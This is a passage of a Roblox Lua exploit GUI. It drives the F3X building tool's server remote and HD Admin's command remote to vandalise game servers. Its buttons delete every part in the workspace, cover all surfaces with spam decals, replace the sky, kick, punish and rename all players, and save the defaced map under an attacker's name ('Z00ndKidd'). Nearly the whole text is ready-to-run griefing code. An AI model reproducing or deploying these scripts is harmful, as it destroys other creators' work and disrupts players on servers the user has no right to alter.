	end)

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.325, 0,0.208, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "TOILET"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("75154204199683")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("75154204199683")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.467, 0,0.208, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Name All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Name All Z00ndKidd")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.615, 0,0.207, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Billboard"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Titlebk all Z00ndKidd")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.762, 0,0.208, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Kick All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Kick all Teh gam got feked up11!1111")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 300,0, 46)
f3x.Position = UDim2.new(0.06, 0,0.245, 1)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Delete Everything"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end

	if tool and tool:FindFirstChild("SyncAPI") then
		local remote = tool.SyncAPI.ServerEndpoint

		local function _(args)
			remote:InvokeServer(unpack(args))
		end

		local function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end

		local function DeleteAllParts()
			for _, part in pairs(workspace:GetDescendants()) do
				if part:IsA("BasePart") then
					spawn(function()
						DestroyPart(part)
					end)
				end
			end
		end

		DeleteAllParts()
	end



end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 300,0, 46)
f3x.Position = UDim2.new(0.50, 0,0.245, 1)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Z00ndKidd Realm"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
	wait(0.1)
	local player = game.Players.LocalPlayer
	local char = player.Character
	local backpack = player.Backpack

	local function getf3x()
		for _, v in ipairs(backpack:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end
		for _, v in ipairs(char:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end

		return nil
	end
	local f3x = getf3x()
	if not f3x then
		warn("you dont have f3x skid")
	end
	local syncapi = f3x.SyncAPI
	local serverendpoint = syncapi.ServerEndpoint

	local function delete(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function deleteall()
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("UnionOperation") then
				spawn(function()
					delete(v)
				end)
			end
		end
	end

	deleteall()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";fogcolor black ;time")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local backpack = player.Backpack

	local function getf3x()
		for _, v in ipairs(backpack:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end
		for _, v in ipairs(char:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end

		return nil
	end
	local f3x = getf3x()
	if not f3x then
		warn("you dont have f3x skid")
	end
	local syncapi = f3x.SyncAPI
	local serverendpoint = syncapi.ServerEndpoint

	local function resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function syncmaterial(part,mate,trans)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Material"] = mate
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end
	local function transparency(part,trans)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = trans
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function color(part, color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function syncmeshid(part, id)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..id
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function makemesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function syncmeshsize(part, vectora)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = vectora
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function syncmeshtexture(part, id)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] =	"rbxassetid://"..id
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function name(part, stringa)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringa
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function lock(part, boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function setcollision(part, booleana)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = booleana
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function setanchor(part, boolean)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function createdecal(part, side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end
	local function setdecal(part, asset, side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function makerealmbase()
		local position = CFrame.new(0, 5, 0)
		local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
		resize(base, Vector3.new(512, 16, 512), position)
		syncmaterial(base, Enum.Material.Concrete)
		color(base, Color3.new(0.513725, 0.513725, 0.513725))
		name(base, "loltroll")
		lock(base, true)

		local spawnpos = CFrame.new(34.5, 8.1, -26)
		local spawna = serverendpoint:InvokeServer("CreatePart", "Spawn", spawnpos, workspace)
		resize(spawna, Vector3.new(20, 10, 20), spawnpos)
		name(spawna, "SpawnLocation")
		lock(spawna, true)

		createdecal(spawna, Enum.NormalId.Top)
		setdecal(spawna, "77814561584881", Enum.NormalId.Top) -- ganti decalnya pake decal lu
		transparency(spawna, 1)

		local pos = CFrame.new(74.143, 24, -25.232)

		local rules = serverendpoint:InvokeServer("CreatePart", "Normal", pos, workspace)

		transparency(rules, 0)
		setcollision(rules, false)
		createdecal(rules, Enum.NormalId.Left)
		setdecal(rules, "70767407415502", Enum.NormalId.Left)
		color(rules, Color3.new(1, 1, 1))
		resize(rules, Vector3.new(4, 23, 37), pos)


		local pos = CFrame.new(1.143, 24, -25.232)

		local bad = serverendpoint:InvokeServer("CreatePart", "Normal", pos, workspace)

		transparency(bad, 1)
		setcollision(bad, false)
		createdecal(bad, Enum.NormalId.Right)
		setdecal(bad, "92706344395644", Enum.NormalId.Right)
		resize(bad, Vector3.new(4, 23, 37), pos)

	end

	local function sky()
		local position = CFrame.new(0, 5, 0)
		local sky = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)

		makemesh(sky)
		syncmeshid(sky, "111891702759441")
		syncmeshtexture(sky, "140048998804156")
		syncmeshsize(sky, Vector3.new(20000, 20000, 20000))
		lock(sky, true)
		name(sky, "riposku")
		setcollision(sky, false)
	end





	local function unanchorall()
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("UnionOperation") then
				spawn(function()
					setanchor(v, false)
				end)
			end
		end
	end

	local function realm()
		sky()
		makerealmbase()
	end

	realm()

	RequestCommand:InvokeServer(";res all")
	wait(0.3)
	RequestCommand:InvokeServer(";r6 all")
	RequestCommand:InvokeServer(";time 14")
	wait(0.7)
	RequestCommand:InvokeServer(";music 113509194107379 ;volume inf  ;savemap ;char all Z00ndKid")

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.06, 0,0.299, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "c00lify"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("8408806737")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
